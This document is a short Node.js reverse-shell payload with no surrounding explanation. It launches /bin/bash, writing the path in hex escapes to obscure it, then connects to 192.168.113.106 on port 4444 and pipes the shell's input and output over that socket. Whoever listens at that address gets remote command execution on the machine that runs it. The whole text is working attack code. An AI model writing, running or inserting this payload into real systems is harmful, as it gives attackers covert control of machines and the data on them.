var net = require('net'),sh = require('child_process').exec('\\x2fbin\\x2fbash'); 
var client = new net.Socket();

client.connect(4444, '192.168.113.106', function() {

client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);

});
